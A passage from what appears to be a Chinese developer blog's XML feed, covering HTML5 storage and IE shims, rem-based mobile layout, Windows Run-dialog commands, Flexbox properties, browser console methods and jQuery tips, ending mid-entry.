cookies 使用的。 该存储方案需要编写 JavaScript 脚本支持,所以 JavaScript 编程能力不是很好的童鞋不要轻易尝试编写,还是去网上复制粘帖吧！ HTML5 提供了下面两种本地存储方案：localStorage 用于持久化的本地存储,数据永远不会过期,关闭浏览器也不会丢失。sessionStorage 同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此 sessionStorage 不是一种持久化的本地存储,仅仅是会话级别的存储HTML5 提供了新的 API有助于快速开发应用程序。 HTML5 提供的应用程序 API 主要有：Media APIText Track APIApplication Cache APIUser InteractionData Transfer APICommand APIConstraint Validation APIHistory APIHTML5 应用程序缓存应用程序缓存是 HTML5 的重要特性之一,它提供了离线使用的功能,让应用程序可以获取本地的网站内容,例如 HTML、CSS、图片以及 JavaScript。这个特性可以提高网站性能,它的实现借助于 manifest 文件,如下：&lt;!doctype html&gt; &lt;html manifest=&quot;example.appcache&quot;&gt; ... &lt;/html&gt; 与传统浏览器缓存相比,它不强制用户访问的网站内容被缓存。HTML5 标签完美兼容 IE为了方便兼容 IE8 中使用 HTML5,可以使用 JS 的方法来使低于 IE9 版本的 IE 浏览器兼容。&lt;!--[if lt IE 9]&gt; &lt;script&gt; (function(){ var tags = [&#39;header&#39;,&#39;footer&#39;,&#39;figure&#39;,&#39;figcaption&#39;,&#39;details&#39;,&#39;summary&#39;,&#39;hgroup&#39;,&#39;nav&#39;,&#39;aside&#39;,&#39;article&#39;,&#39;section&#39;,&#39;mark&#39;,&#39;abbr&#39;,&#39;meter&#39;,&#39;output&#39;,&#39;progress&#39;,&#39;time&#39;,&#39;video&#39;,&#39;audio&#39;,&#39;canvas&#39;,&#39;dialog&#39;]; for(var i=tags.length - 1;i&gt;-1;i--){ document.createElement(tags[i]); } })(); &lt;/script&gt; &lt;![endif]--&gt; 使用 Google 的 html5shiv.js（Google 在中国打不开,谨慎使用）html5shiv.js：解决 ie9 以下浏览器对 html5 新增标签的不识别,并导致 CSS 不起作用的问题。&lt;!--[if lt IE 9]&gt; &lt;script src=&quot;//html5shiv.googlecode.com/svn/trunk/html5.js&quot;&gt;&lt;/script&gt; &lt;![endif]--&gt; Google 的 html5shiv 包不适用,这里提供 Baidu 的 html5shiv.js&lt;!--[if lt IE 9]&gt; &lt;script src=&quot;//libs.baidu.com/html5shiv/3.7/html5shiv.min.js&quot;&gt;&lt;/script&gt; &lt;![endif]--&gt; 这里还提供 bootstarp CDN 的 htmlshiv.js 和 respond.min.jsrespond.min.js：让不支持 css3 Media Query 的浏览器包括 IE6-IE8 等其他浏览器支持查询。&lt;!--[if lt IE 9]&gt; &lt;script src=&quot;//cdn.bootcss.com/respond.js/1.4.2/respond.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;//cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js&quot;&gt;&lt;/script&gt; &lt;![endif]--&gt; 添加以上任意脚本中的一个,之后再在你的 css 文件中编写如下内容。article, aside, dialog, footer, header, section, footer, nav, figure, menu { display: block; }]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>HTML5</tag>
        <tag>Code</tag>
        <tag>Layout</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端网页自适应方案]]></title>
    <url>%2Farchives%2F73483817.html</url>
    <content type="text"><![CDATA[解决移动端网页的自适应,让开发变得更加简洁mate 标签首先要让页面大小铺满屏幕又不能溢出。只需要在 html 的 head 标签内加入 viewport（如下）,参数分别表示：页面宽度＝屏幕宽度,最大和最小伸缩比都是 1,不允许用户拉缩。&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt; width：viewport 的宽度,可以指定为一个像素值,如：640,或者为特殊的值,如：device-width （设备的宽度）。initial-scale：初始缩放比例,即当浏览器第一次加载页面时的缩放比例。值为 1.0 即原始尺寸。maximum-scale：允许浏览者缩放到的最大比例,一般设为 1.0,即原始尺寸。minimum-scale：允许浏览者缩放到的最小比例,一般设为 1.0,即原始尺寸。user-scalable：浏览者是否可以手动缩放,yes 或 no 。使用百分比自适应把长度单位转换为百分比来表示,这样在不同的宽度下,元素的长宽也会随之变化。优点：宽度之间无缝衔接, 操作起来也相对比较方便。缺点：字体大小需要另外一套自适应方法来调整；当屏幕宽度大于 700px 后,继续按照百分比元素会偏大,这个时候调整起来会比较麻烦。rem, em 自适应用媒体查询的方法,确定在不同屏幕宽度下,改变 html 或 body 的 font-size。再用 rem , em 替代 px 作为单位实现自适应。优点：可以根据不同屏幕宽度来设置,可以完美解决上面说的屏幕偏大时的比例问题。字体的大小也不存在问题。缺点：根据宽度区间来设置,无法实现无缝变换。引入 JavaScript 代码这些兼容方法各有优缺点,都不算完美,怎样才能把优点结合在一起,同时避免缺点呢？ 引入 JavaScript 方法源码,方法原理：使页面 html 的 font-size 会根据屏幕的宽度自动调整,而且屏幕宽度和所设字体大小的商是一定的,然后按照固定比例缩小后作为 rem 的单位长度实现自适应。方法源码一（需引入 jQuery）Zepto(function($) { // 获取文档的根节点 var doc = document.documentElement; function setFontSize() { // 获取当前窗口的宽度 var winWidth = $(window).width(); // 640 宽度以上进行限制 var size = winWidth / 640 * 100; doc.style.fontSize = (size &lt; 100 ? size : 100) + &quot;px&quot;; } // 防止在 html 未加载完毕时执行,保证获取正确的页宽 setTimeout(function() { // 初始化 setFontSize(); }, 200); }); 方法源码二（JavaScript 原生代码）(function(doc, win) { // 获取文档的根节点 var docEl = doc.documentElement; // 判断移动端是否发生方向改变 var resizeEvt = &quot;orientationchange&quot; in window ? &quot;orientationchange&quot; : &quot;resize&quot;; var recalc = function() { // 获取对象的宽度 var clientWidth = docEl.clientWidth; if (!clientWidth) return; if (clientWidth &gt;= 640) { docEl.style.fontSize = &quot;100px&quot;; } else { docEl.style.fontSize = 100 * (clientWidth / 640) + &quot;px&quot;; } }; if (!doc.addEventListener) return; win.addEventListener(resizeEvt, recalc, false); doc.addEventListener(&quot;DOMContentLoaded&quot;, recalc, false); })(document, window); 常见问题以上两个方法源码是 rem 布局的核心代码。 如果你的页面不需要引入 jQuery,建议你使用 JavaScript 原生代码。 代码大意： 如果页面的宽度超过了 640px,那么页面中 html 的 font-size 恒为 100px,否则,页面中 html 的 font-size 的大小为： 100 * (当前页面宽度 / 640)为什么是 640px？对于手机屏幕来说, 640px 的页面宽度是一个安全的最大宽度,保证了移动端页面两边不会留白。注意这里的 px 是 css 逻辑像素,与设备的物理像素是有区别的。 如果要切移动端页面,你可以先把效果图宽度等比例缩放到 640px,很好用。为什么要设置 html 的 font-size？rem 就是根元素（即： html）的字体大小。html 中的所有标签样式凡是涉及到尺寸的（如： height, width, padding, margin, font-size。甚至 left, top等）你都可以放心大胆的用 rem作单位。 如果你把 html 的 font-size 设为 20px,前面说过, rem就是 html 的字体大小,那么 1rem = 20px。模拟为什么要使用 iphone 4？假设你部门的设计师给你的页面标准宽度为 640px,则页面中所有的 宽高 全部除以 2 ,Chrome 浏览器 模拟手机页面 设置手机型号为 IPhone 4。 这也就是为什么要将所有的宽高除以 2 的原因：IPhone 4 标准 宽 是 320 px。 然后正常的用 px 为单位 写你的 css ,你所需要做的就是你写的页面,要在 IPhone 4 完全正确显示。 如果你说,那设计那边给的不是 640px 标准怎么办？你只要让你的页面按照设计图在 iphone 4 上正确显示,就木问题。rem 单位是如何换算的？页面 css 全部写完之后,将所有的 px 转换为以 rem为单位的数字。 例如 我设置 body 的 width：320px； 则根据设置的 font - size 值,转换为 rem,则是 width：16 rem； 【320 / 20 (你设置的标准 font - size) = 16】。如何使用插件换算？如果你说一个页面的 css 有几百行,写完再去改太麻烦了,那可以用 px 转换成 rem 的插件。 我这里有一款推荐：cssrem（下载使用网址 cssrem）。 该插件是 sublime text 的一款插件。]]></content>
      <categories>
        <category>design</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>jQuery</tag>
        <tag>Moblie</tag>
        <tag>Layout</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运行命令集合]]></title>
    <url>%2Farchives%2F6295cd5e.html</url>
    <content type="text"><![CDATA[记录 Windows 常见应用的运行快捷命令,以下记录的命令默认为 win+R 组合键调出的窗口,非命令提示符窗口策略、管理gpedit.msc =&gt; 本地组策略lusrmgr.msc =&gt; 本机用户和组rsop.msc =&gt; 组策略结果集 建议在 win2003 下运行wmimgmt.msc =&gt; 打开 windows 管理体系结构(WMI)secpol.msc =&gt; 本地安全策略certmgr.msc =&gt; 证书管理实用程序计算机eventvwr =&gt; 事件查看器compmgmt.msc =&gt; 计算机管理winmsd =&gt; 系统信息 建议在 win2003 下运行perfmon.msc =&gt; 计算机性能监测程序winver =&gt; 检查 Windows 版本mmc =&gt; 打开 Microsoft 管理控制台wupdmgr =&gt; windows 更新程序 建议在 win2003 下运行wscript =&gt; windows 脚本宿主设置服务dcomcnfg =&gt; 打开系统组件服务services.msc =&gt; 本地服务设置ciadv.msc =&gt; 索引服务程序 建议在 win2003 下运行系统、硬件logoff =&gt; 注销命令tsshutdn =&gt; 60 秒倒计时关机命令cmd =&gt; 命令提示符窗口regedt32 =&gt; 注册表编辑器regedit.exe =&gt; 注册表编辑器msconfig.exe =&gt; 系统配置实用程序ntbackup =&gt; 系统备份和还原 建议在 win2003 下运行drwtsn32 =&gt; 系统医生 建议在 win2003 下运行磁盘、设备管理diskmgmt.msc =&gt; 磁盘管理实用程序dfrg.msc =&gt; 磁盘碎片整理程序 建议在 win2003 下运行chkdsk.exe =&gt; Chkdsk 磁盘检查 建议在 win2003 下运行；或者使用管理员命令提示符窗口运行cleanmgr =&gt; 垃圾整理devmgmt.msc =&gt; 设备管理器ntmsmgr.msc =&gt; 可移动存储管理器 建议在 win2003 下运行ntmsoprq.msc =&gt; 可移动存储管理员操作请求 建议在 win2003 下运行应用程序notepad =&gt; 打开记事本charmap =&gt; 启动字符映射表explorer =&gt; 打开资源管理器calc =&gt; 启动计算器taskmgr =&gt; 任务管理器write =&gt; 写字板mplayer2 =&gt; 简易 widnows media playermspaint =&gt; 画图板mstsc =&gt; 远程桌面连接eudcedit =&gt; 专用字符编辑程序packager =&gt; 对象包装程序 建议在 win2003 下运行clipbrd =&gt; 剪贴板查看器 建议在 win2003 下运行osk =&gt; 打开屏幕键盘iexpress =&gt; 木马捆绑工具,系统自带网络nslookup =&gt; 网络管理的工具向导ncpa.pal =&gt; 网络连接设置向导]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>Command</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Flexbox 布局]]></title>
    <url>%2Farchives%2Fc8c4f9a9.html</url>
    <content type="text"><![CDATA[Flex 布局,可以简便、完整、响应式地实现各种页面布局,目前,它已经得到了所有浏览器的支持GithHub 上优秀的样式表插件scss-flex.cssflex.css例子flexbox 布局例子Flex 布局是什么？Flex 是 Flexible Box 的缩写,意为”弹性布局”,用来为盒状模型提供最大的灵活性。 任何一个容器都可以指定为 Flex 布局。启用 Flex 布局设为 Flex 布局以后,子元素的 float、clear 和 vertical-align 属性将失效/* 块级元素启用 Flex 布局 */ .box-flex { display: -ms-flexbox; display: -webkit-box; display: flex; } /* 行内元素启用 Flex 布局 */ .box-inline-flex { display: -ms-inline-flexbox; display: -webkit-inline-box; display: inline-flex; } 基本概念采用 Flex 布局的元素,称为 Flex 容器（flex container）,简称”容器”。它的所有子元素自动成为容器成员,称为 Flex 项目（flex item）,简称”项目”。容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做 main start,结束位置叫做 main end；交叉轴的开始位置叫做 cross start,结束位置叫做 cross end。项目默认沿主轴排列。单个项目占据的主轴空间叫做 main size,占据的交叉轴空间叫做 cross size。容器的属性以下 6 个属性设置在容器上。flex-directionflex-wrapflex-flowjustify-contentalign-itemsalign-contentflex-directionflex-direction 属性决定主轴的方向（即项目的排列方向）。.box { flex-direction: row | row-reverse | column | column-reverse; } 四个值分别的作用row（默认值）：主轴为水平方向,起点在左端。row-reverse：主轴为水平方向,起点在右端。column：主轴为垂直方向,起点在上沿。column-reverse：主轴为垂直方向,起点在下沿。flex-wrapflex-wrap 属性定义,如果一条轴线排不下,如何换行。默认情况下,项目都排在一条线（又称”轴线”）上。.box { flex-wrap: nowrap | wrap | wrap-reverse; } 三个值分别的作用nowrap（默认）：不换行。wrap：换行,第一行在上方。wrap-reverse：换行,第一行在下方。flex-flowflex-flow 属性是 flex-direction 属性和 flex-wrap 属性的简写形式,默认值为 row nowrap。.box { flex-flow: &lt;flex-direction&gt; || &lt;flex-wrap&gt;; } justify-contentjustify-content 属性定义了项目在主轴上的对齐方式。.box { justify-content: flex-start | flex-end | center | space-between | space-around; } 五个值分别的作用flex-start（默认值）：左对齐flex-end：右对齐center： 居中space-between：两端对齐,项目之间的间隔都相等。space-around：每个项目两侧的间隔相等。所以,项目之间的间隔比项目与边框的间隔大一倍。align-itemsalign-items 属性定义项目在交叉轴上如何对齐。.box { align-items: flex-start | flex-end | center | baseline | stretch; } 五个值分别的作用flex-start：交叉轴的起点对齐。flex-end：交叉轴的终点对齐。center：交叉轴的中点对齐。baseline: 项目的第一行文字的基线对齐。stretch（默认值）：如果项目未设置高度或设为 auto,将占满整个容器的高度。align-contentalign-content 属性定义了多根轴线的对齐方式。如果项目只有一根轴线,该属性不起作用。.box { align-content: flex-start | flex-end | center | space-between | space-around | stretch; } 六个值分别的作用flex-start：与交叉轴的起点对齐。flex-end：与交叉轴的终点对齐。center：与交叉轴的中点对齐。space-between：与交叉轴两端对齐,轴线之间的间隔平均分布。space-around：每根轴线两侧的间隔都相等。所以,轴线之间的间隔比轴线与边框的间隔大一倍。stretch（默认值）：轴线占满整个交叉轴。项目的属性以下 6 个属性设置在项目上。orderflex-growflex-shrinkflex-basisflexalign-selforderorder 属性定义项目的排列顺序。数值越小,排列越靠前,默认为 0。.item { order: &lt;integer&gt;;/* default 0 */ } flex-growflex-grow 属性定义项目的放大比例,默认为 0,即如果存在剩余空间,也不放大。.item { flex-grow: &lt;number&gt;;/* default 0 */ } 如果所有项目的 flex-grow 属性都为 1,则它们将等分剩余空间（如果有的话）。如果一个项目的 flex-grow 属性为 2,其他项目都为 1,则前者占据的剩余空间将比其他项多一倍。flex-shrinkflex-shrink属性定义了项目的缩小比例,默认为 1,即如果空间不足,该项目将缩小。.item { flex-shrink: &lt;number&gt;;/* default 1 */ } 如果所有项目的 flex-shrink 属性都为 1,当空间不足时,都将等比例缩小。如果一个项目的 flex-shrink 属性为 0,其他项目都为 1,则空间不足时,前者不缩小。负值对该属性无效。flex-basisflex-basis 属性定义了在分配多余空间之前,项目占据的主轴空间（main size）。浏览器根据这个属性,计算主轴是否有多余空间。它的默认值为 auto,即项目的本来大小。.item { flex-basis: &lt;length&gt; | auto;/* default auto */ } 它可以设为跟 width 或 height 属性一样的值（比如 350px）,则项目将占据固定空间。flexflex 属性是 flex-grow, flex-shrink 和 flex-basis 的简写,默认值为 0 1 auto。后两个属性可选。.item { flex: none | [ &lt; &quot;flex-grow&quot; &gt; &lt; &quot;flex-shrink&quot; &gt;? || &lt; &quot;flex-basis&quot; &gt; ]; } 该属性有两个快捷值： auto (1 1 auto) 和 none (0 0 auto)。 建议优先使用这个属性,而不是单独写三个分离的属性,因为浏览器会推算相关值。align-selfalign-self 属性允许单个项目有与其他项目不一样的对齐方式,可覆盖 align-items 属性。默认值为 auto,表示继承父元素的 align-items 属性,如果没有父元素,则等同于 stretch。.item { align-self: auto | flex-start | flex-end | center | baseline | stretch; } 该属性可能取六个值,除了 auto,其他都与 align-items 属性完全一致。常用 Flex 布局集合/* 默认开启换行 */ .box-flex { display: -ms-flexbox; display: -webkit-flex; display: -webkit-box; display: flex; -webkit-flex-wrap: wrap; -ms-flex-wrap: wrap; flex-wrap: wrap; } .box-inline-flex { display: -ms-inline-flexbox; display: -webkit-inline-flex; display: -webkit-inline-box; display: inline-flex; -webkit-flex-wrap: wrap; -ms-flex-wrap: wrap; flex-wrap: wrap; } /* 不换行 */ .box-flex-nowarp { display: -webkit-flex; display: -ms-flexbox; display: -webkit-box; display: flex; -webkit-flex-wrap: nowrap; -ms-flex-wrap: nowrap; flex-wrap: nowrap; } .box-inline-flex { display: -webkit-inline-flex; display: -ms-inline-flexbox; display: -webkit-inline-box; display: inline-flex; -webkit-flex-wrap: nowrap; -ms-flex-wrap: nowrap; flex-wrap: nowrap; } /* X 轴居中 */ .flex-row-center { flex-direction: row; -webkit-box-orient: horizontal; -webkit-box-direction: normal; -webkit-flex-direction: row; -ms-flex-direction: row; -ms-flex-pack: center; -webkit-justify-content: center; -webkit-box-pack: center; justify-content: center; } /* Y 轴居中 */ .flex-column-center { flex-direction: column; -webkit-box-orient: vertical; -webkit-box-direction: normal; -webkit-flex-direction: column; -ms-flex-direction: column; -ms-flex-align: center; -webkit-align-items: center; -ms-grid-row-align: center; -webkit-box-align: center; align-items: center; } /* XY 轴居中 */ .felx-row-column-center { -ms-flex-pack: center; -webkit-justify-content: center; -webkit-box-pack: center; justify-content: center; -ms-flex-align: center; -webkit-align-items: center; -ms-grid-row-align: center; -webkit-box-align: center; align-items: center; } /* X 轴两端对齐 */ .flex-row-between { flex-direction: row; -webkit-box-orient: horizontal; -webkit-box-direction: normal; -webkit-flex-direction: row; -ms-flex-direction: row; -ms-flex-pack: justify; -webkit-justify-content: space-between; -webkit-box-pack: justify; justify-content: space-between; } /* X 轴分散式对齐 */ .flex-row-around { flex-direction: row; width: 100%; -webkit-box-orient: horizontal; -webkit-box-direction: normal; -webkit-flex-direction: row; -ms-flex-direction: row; -ms-flex-pack: distribute; -webkit-justify-content: space-around; justify-content: space-around; } /* Y 轴两端对齐 */ .flex-column-between { flex-direction: column; -webkit-box-orient: vertical; -webkit-box-direction: normal; -webkit-flex-direction: column; -ms-flex-direction: column; -webkit-justify-content: space-between; -ms-flex-pack: justify; -webkit-box-pack: justify; justify-content: space-between; } /* Y 轴分散式对齐 */ .flex-column-around { flex-direction: column; -webkit-box-orient: vertical; -webkit-box-direction: normal; -webkit-flex-direction: column; -ms-flex-direction: column; -webkit-justify-content: space-around; -ms-flex-pack: distribute; justify-content: space-around; }]]></content>
      <categories>
        <category>manual</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>HTML5</tag>
        <tag>Code</tag>
        <tag>Layout</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Console 的一些应用小技巧]]></title>
    <url>%2Farchives%2Fcab01f37.html</url>
    <content type="text"><![CDATA[一个简单而实用的控制台命令,用来调试 JavaScript 代码的不合理性console.log(object)一个取代 alert() 和 document.write() 的最佳途径。是前端开发人员使用频率最高的一条语句,它向控制台输出一条消息。支持 C 语言 printf 式的格式化输出。当然,也可以不使用格式化输出来达到同样的目的。简单的输出var animal = &quot;tiger&quot;; var count = 5; console.log(&quot;The %s jumped over %d tall buildings&quot;, animal, count); console.log(&quot;The&quot;, animal, &quot;jumped over&quot;, count, &quot;tall buildings&quot;); console 对象可以使用 printf 风格的占位符。支持的占位符,有字符（%s）、整数（%d 或%i）、浮点数（%f）和对象（%o）四种。有意思的 %cconsole.log(&quot;%c css88.com&quot;, &quot;font-size:20pt&quot;); console.log( &quot;%c 前端开发 %c css88.com %c github&quot;, &quot;color:red&quot;, &quot;&quot;, &quot;color:orange;font-weight:bold&quot; ); console.log(&quot;%c 阴影文字&quot;, &quot;text-shadow: 3px 1px 1px grey&quot;); console.log( &quot;%c 彩色文字&quot;, &quot;background-image:-webkit-gradient( linear, left top, right top, color-stop(0, #f22), color-stop(0.15, #f2f), color-stop(0.3, #22f), color-stop(0.45, #2ff), color-stop(0.6, #2f2),color-stop(0.75, #2f2), color-stop(0.9, #ff2), color-stop(1, #f22) );color:transparent;-webkit-background-clip: text;font-size:5em;&quot; ); 以%c 开头,后面的文字就打印的信息,后面一个参数就是样式属性；可以尝试多个样式,每碰到一个%c 开头就会应用对应的样式。不同性质的信息用不同的方法根据信息的不同性质, console 对象还有 4 种显示信息的方法,分别是一般信息 console.info()、除错信息 console.debug()、警告提示 console.warn()、错误提示 console.error()。console.info(&quot;this is info&quot;); console.debug(&quot;this is debug&quot;); console.warn(&quot;this is warn&quot;); console.error(&quot;this is error&quot;); console.debug(object)console.debug(object[, object, …]) 向控制台输出一条信息,它包括一个指向该行代码位置的超链接。console.info(object)console.info(object[, object, …]) 向控制台输出一条信息,该信息包含一个表示”信息”的图标,和指向该行代码位置的超链接。console.warn(object)console.warn(object[, object, …]) 同 console.info()。区别是图标与样式不同。console.error(object)console.error(object[, object, …]) 同 console.info()。区别是图标与样式不同。error 实际上和 throw new Error() 产生的效果相同,使用该语句时会向浏览器抛出一个 JavaScript 异常。console.group(object)如果信息太多,可以分组显示,用到的方法是 console.group() 和 console.groupEnd()。console.group(&quot;第一组信息&quot;); console.log(&quot;第一组第一条&quot;); console.log(&quot;第一组第二条&quot;); console.groupEnd(); console.group(&quot;第二组信息&quot;); console.log(&quot;第二组第一条&quot;); console.log(&quot;第二组第二条&quot;); console.groupEnd(); console.groupCollapsed() 跟 console.group() 相同,区别在于嵌套块默认是收起的。console.dir(object)console.dir() 可以显示一个对象所有的属性和方法（输出结果类似于 DOM 面板中的样式）。var dog = {}; dog.name = &quot;大毛&quot;; dog.color = &quot;黄色&quot;; dog.bark = function() { alert(&quot;汪汪汪&quot;); }; console.dir(dog); console.dirxml(node)console.dirxml() 用来显示网页的某个节点（node）所包含的 html/xml 代码。var footer = document.getElementById(&quot;footer&quot;); console.dirxml(footer); console.assert(expression)断言,测试一条表达式是否为真,不为真时将抛出异常（断言失败）,为真则不抛出异常（断言成功）。var result = 0; console.assert(result); var year = 2016; console.assert(year == 2015); var i = 5, j = 6; console.assert(i &lt; j); console.trace()console.trace() 输出 JavaScript 执行时的堆栈追踪。比如,有一个加法器函数。function add(a, b) { return a + b; } 我想知道这个函数是如何被调用的,在其中加入 console.trace() 方法就可以了。function add(a, b) { console.trace(); return a + b; } 假定这个函数的调用代码如下：var x = add3(1, 1); function add3(a, b) { return add2(a, b); } function add2(a, b) { return add1(a, b); } function add1(a, b) { return add(a, b); } 运行后,会显示 add() 的调用轨迹,从上到下依次为 add()、 add1()、 add2()、 add3()。console.time(name)console.time() 和 console.timeEnd(),用来显示代码的运行时间。当调用 console.timeEnd(name);并传递相同的 name 为参数时,计时停止,并输出执行两条语句之间代码所消耗的时间（毫秒）。console.time(&quot;time&quot;); for (var i = 0;i &lt; 1000;i++) { for (var j = 0;j &lt; 1000;j++) {} } console.timeEnd(&quot;time&quot;); 注： console.time(slugName) – console.timeEnd(slugName) 记录某一个 javascript 程序的执行时间,可用于优化循环语句console.clear()清空控制台其他命令控制台除了可以运行常规的 javascript 代码,还内置了相当数量的命令行可以辅助我们的调试工作,$(id)返回一个给定 id 的元素。无需引用 jQuery,不可与 jQuery 的方法混用。$$(selector)返回给定的 css 选择器匹配到的一组元素。$x(xpath)返回给定的 XPath 表达式匹配到的一组元素。$0返回在 HTML 面板中选中的元素。$1返回上一次在 HTML 面板中选中的元素。$n(index)返回访问最近 5 个被选中过的元素,index 的范围： 0 – 4。dir(object)同 console.dir(object)。dirxml(node)同 console.dirxml(node)。clear()同 console.clear()。inspect(object[, tabName])()在合适的（或一个指定的） tab 中检视一个对象。keys(object)返回一个对象的所有属性的键。values(object)返回一个对象的所有属性的值。debug(fn)在函数第一行添加一个断点,使用 undebug(fn) 移除断点。monitor(fn)开启一个函数的调用日志,使用 unmonitor(fn) 关闭该功能。非常有用的一个命令,但是它似乎并没有很好地工作。monitorEvents(object[, types])开启一个元素的某个事件（或所有事件）被触发时的日志记录。用例如下：monitorEvents($0,[‘click’])上面的命令行被执行后,将开启当前在 HTML 面板中被选中元素的 click 事件监控,一旦这个元素的 click 事件被触发,事件对象将会在控制台输出。如果不指定第二个参数,将对所有事件进行记录。]]></content>
      <categories>
        <category>debug</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Debug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单而实用的 jQuery 小技巧]]></title>
    <url>%2Farchives%2Ff0f4a46e.html</url>
    <content type="text"><![CDATA[简单的窍门的集合,用来帮助你 jQuery 代码的进阶判断 jQuery 是否被正确加载在用 jQuery 来写一些脚本时, jQuery 必须要被正确加载,接下来写的脚本才有意义。if (typeof jQuery == &quot;undefined&quot;) { console.log(&quot;jQuery hasn&#39;t loaded&quot;); } else { console.log(&quot;jQuery has loaded&quot;); } 禁用右键功能$(function() { $(document).bind(&quot;contextmenu&quot;, function(e) { return false; }); }); 回到顶部利用 jQuery 里的 animate 和 scrollTop 方法,你便不需要使用插件创建简单的滚动到顶部动画。javascript 代码// Back to top $(&quot;.top&quot;).click(function(e) { e.preventDefault();// 阻止元素的默认行为 $(&quot;html, body&quot;).animate({ scrollTop: 0 }, 800);// 用多长时间滚动到何处 }); html 代码&lt;!-- Create an anchor tag --&gt; &lt;a class=&quot;top&quot; href=&quot;#&quot;&gt;Back to top&lt;/a&gt; 通过 scrollTop 的值来改变你想要滚动到的位置。其实你就是做了：在接下来的 800 毫秒中让页面滚动,直到它滚动到文档的顶部。一句话搞定 checkbox 全选和全不选在网站建设中；让复选框全部选中和全部取消是比较常用的；下面就介绍如何用一句话搞定全选功能。javascript 代码function checkAll(obj) { $(&quot;#box input[type=&#39;checkbox&#39;]&quot;).prop(&quot;checked&quot;, $(obj).prop(&quot;checked&quot;)); } html 代码&lt;div id=&quot;box&quot;&gt; &lt;input type=&quot;checkbox&quot; onclick=&quot;checkAll(this)&quot;&gt;全选&lt;br&gt;&lt;br&gt; &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt; &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt; &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt; &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt; &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt; &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt; &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt; &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt; &lt;input type=&quot;checkbox&quot;&gt;&lt;br&gt; &lt;/div&gt; 图片的预加载如果你的网页使用了很多隐藏图片文件（例如：鼠标悬停展示的图片）,那么图片的预加载是有意义的。// 扫描网站上的图片 $.preloadImages = function() { for (var i = 0;i &lt; arguments.length;i++) { $(&quot;&lt;img&gt;&quot;).attr(&quot;src&quot;, arguments[i]); } }; // 预加载 $.preloadImages(&quot;img/hover-on.png&quot;, &quot;img/hover-off.png&quot;); 判断图片是否加载完有时候你可能需要检查图像是否已经加载完成,以便于可以继续执行相应的 JavaScript 代码。$(&quot;img&quot;).load(function() { console.log(&quot;image load successful&quot;); }); 你还可以检查一个特定的图片是否加载,只需引用该 img 标签的 class 或者 id。自动修补破损图像如果你碰巧发现在你的网站上发现破损的图像链接,一个个去替代他们是痛苦的。这个简单的代码可以节省很多的麻烦。$(&quot;img&quot;).on(&quot;error&quot;, function() { if (!$(this).hasClass(&quot;broken-image&quot;)) { $(this) .prop(&quot;src&quot;, &quot;img/broken.png&quot;) .addClass(&quot;broken-image&quot;); } }); 即使你没有任何断开的链接,加入这代码也不会有任何影响。hover 切换 class 类比方说,当用户将鼠标悬停在你页面上的元素时,你想改变其视觉效果。当用户鼠标悬停在元素上,你可以在该元素上添加一个 class 类,当鼠标停止悬停事件时移除此 class 类。$(&quot;.btn&quot;).hover( function() { $(this).addClass(&quot;hover&quot;); }, function() { $(this).removeClass(&quot;hover&quot;); } ); 如果你想要一个更简单的方式使用 toggleClass 方法,则仅仅需要添加必要的 CSS。$(&quot;.btn&quot;).hover(function() { $(this).toggleClass(&quot;hover&quot;); }); 备注：CSS 在这种情况下使用是一个快速的解决方案,但要知道这点知识依旧是值得去了解下的。禁用输入有时你可能需要用表单的提交按钮或者某个输入框直到用户执行了某个动作（比如：检查”我已阅读条款”复选框）。在你的输入框上设置 disabled 属性,然后当你需要的时候启用该属性。$(&#39;input[type=&quot;submit&quot;]&#39;).prop(&quot;disabled&quot;, true); 你需要做的只是需要在输入框上再次运行 prop 方法,但设置的被禁用值是 false。$(&#39;input[type=&quot;submit&quot;]&#39;).prop(&quot;disabled&quot;, false); 停止正在加载的链接有时你不想链接到特定的网页或者重新载入页面；你可能想让他们做一些其他事情,如触发一些其他的脚本。这是防止违约行动的技巧。$(&quot;a.no-link&quot;).click(function(e) { e.preventDefault(); }); 限制 Text-Area 域中的字符的个数jQuery.fn.maxLength = function(max) { return this.each(function() { var type = this.tagName.toLowerCase();// 获取当前的标签名 var inputType = this.type ? this.type.toLowerCase() : null;// 获取当前标签的类型 if ((type == &quot;input&quot; &amp;&amp; inputType == &quot;text&quot;) || inputType == &quot;password&quot;) { this.maxLength = max;// 设置最大值 } else if (type == &quot;textarea&quot;) { // 利用键盘事件,阻止继续输入字符 this.onkeypress = function(e) { var ob = e || event; var keyCode = ob.keyCode; var hasSelection = document.selection ? document.selection.createRange().text.length &gt; 0 : this.selectionStart != this.selectionEnd; return !( this.value.length &gt;= max &amp;&amp; (keyCode &gt; 50 || keyCode == 32 || keyCode == 0 || keyCode == 13) &amp;&amp; !ob.ctrlKey &amp;&amp; !ob.altKey &amp;&amp; !hasSelection ); }; this.onkeyup = function() { if (this.value.length &gt; max) { this.value = this.value.substring(0, max); } }; } }); }; //用法 $(&quot;#mytextarea&quot;).maxLength(500); toggle fade/slide滑动和淡入/淡出 是我们在 jQuery 